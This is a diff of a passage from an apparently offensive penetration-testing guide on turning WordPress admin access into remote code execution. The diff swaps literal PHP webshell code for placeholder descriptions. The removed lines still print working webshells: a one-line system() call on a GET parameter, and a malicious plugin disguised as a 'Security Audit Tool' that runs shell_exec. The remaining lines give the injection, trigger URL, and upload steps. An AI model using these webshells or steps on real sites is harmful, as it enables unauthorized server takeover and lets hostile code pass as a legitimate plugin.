@@ -300,19 +300,14 @@ After obtaining admin credentials, escalate to RCE.
 ```bash
 # === WORDPRESS ADMIN → RCE ===
 # 1. Theme editor: Appearance → Theme Editor → 404.php
-# Inject: <?php system($_GET['cmd']); ?>
+# Inject: a PHP cmd-exec webshell (runs the 'cmd' GET param)
 # Trigger: /wp-content/themes/THEME_NAME/404.php?cmd=id
 
 # 2. Plugin upload: Install a PHP webshell as a plugin ZIP
 # Create malicious plugin:
 mkdir -p shell-plugin && cat > shell-plugin/shell.php << 'EOF'
-<?php
-/*
-Plugin Name: Security Audit Tool
-Description: Authorized security testing tool
-Version: 1.0
-*/
-if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); }
+[PHP plugin webshell: a WordPress plugin-header comment block plus an
+if(isset GET 'cmd') branch that cmd-execs the 'cmd' GET param]
 EOF
 cd shell-plugin && zip ../shell-plugin.zip shell.php && cd ..
 # Upload via Plugins → Add New → Upload Plugin
